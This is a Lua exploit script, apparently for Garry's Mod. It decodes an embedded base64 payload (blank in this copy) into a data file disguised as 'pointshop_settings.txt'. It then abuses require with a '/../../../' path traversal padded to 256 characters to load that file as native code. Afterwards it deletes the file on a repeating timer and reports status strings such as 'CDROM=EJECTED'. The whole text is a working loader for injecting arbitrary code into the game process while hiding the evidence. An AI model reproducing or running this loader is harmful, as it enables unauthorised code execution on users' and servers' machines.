

local Cock 	= [[ ]]
local Balls	= "pointshop_settings.txt"

if not _H.NotSIW() then
	_H.DelayGMG("CDROM=NotWindows")
	return 1337
end

local function Del()
	if _H.NotFE(Balls, "DATA") then
		_H.NotFD(Balls)
	end
end
Del()

local Words = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function Suck(Ass)
    Ass = Ass:gsub('[^'..Words..'=]', '')
    return (Ass:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(Words:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

Cock = Suck(Cock)
if not Cock or #Cock == 0 then
	_H.DelayGMG("CDROM=NoCock")
	return 1337
end

local Out = _H.NotFO(Balls, "ab", "DATA")
	if not Out then
		_H.DelayGMG("CDROM=NoFO")
		return 1337
	end
	
	_H.F_Write(Out, Cock)
_H.F_Close(Out)


if not _H.NotFE(Balls, "DATA") then
	_H.DelayGMG("CDROM=NoBalls")
	return 1337
end


local function Blow(Dick)
	Dick = "/../../../"..Dick
	Dick = Dick..string.rep(" ", 256 - #Dick)
	
	local Modules = _MODULES
	_MODULES = {}
		_H.NotRQ(Dick)
	_MODULES = Modules
end

local Ret,Err = _H.pcall(Blow, "data/"..Balls)
Del()

if Err then
	return Err
end

local Tim = 30
_H.NotTC(_H.tostring(Del), 2, Tim, function()
	Del()
	
	if _G.IN_CDROM then
		Tim = false
		_H.DelayGMG("CDROM=EJECTED")
	end
end)

_H.NotTS(Tim, function()
	if not Tim then
		_H.DelayGMG("CDROM=Error")
	end
end)

return 1337

















